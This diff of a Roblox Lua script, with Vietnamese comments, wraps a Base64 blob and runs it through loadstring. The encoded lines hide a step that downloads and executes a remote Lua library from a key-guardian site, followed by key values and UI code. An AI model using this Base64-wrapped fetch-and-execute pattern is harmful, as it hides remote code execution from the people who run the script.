@@ -1,4 +1,7 @@
-bG9jYWwgS2V5R3VhcmRMaWJyYXJ5ID0gbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vY2RuLmtleWd1YXJkaWFuLm9yZy9saWJyYXJ5L3YxLjAuMC5sdWEiKSkoKQ==
+local HttpService = game:GetService("HttpService")
+
+-- Đây là chuỗi mã hóa Base64 từ tệp Lua của bạn
+local encodedScript = "bG9jYWwgS2V5R3VhcmRMaWJyYXJ5ID0gbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vY2RuLmtleWd1YXJkaWFuLm9yZy9saWJyYXJ5L3YxLjAuMC5sdWEiKSkoKQ==
 bG9jYWwgdHJ1ZURhdGEgPSAiMGJhYWVlNzgxODMxNDA1ZGEzOWYyZjcxNThmZTZiMjki
 bG9jYWwgZmFsc2VEYXRhID0gImJjZWJiYjRlOGZiMDQ5OTk4Y2Q1NzYzNGQwMDE1ZDJkIg==
 
@@ -108,4 +111,10 @@ ICAgICAgICBlbmQ=
 ICAgIH0p
 
 ICAgIFdpbmRvdzpTZWxlY3RUYWIoMSk=
-ZW5k
+ZW5k"  -- Thay thế bằng chuỗi mã hóa của bạn
+
+-- Giải mã từ Base64
+local decodedScript = HttpService:Base64Decode(encodedScript)
+
+-- Thực thi mã Lua đã giải mã
+loadstring(decodedScript)()
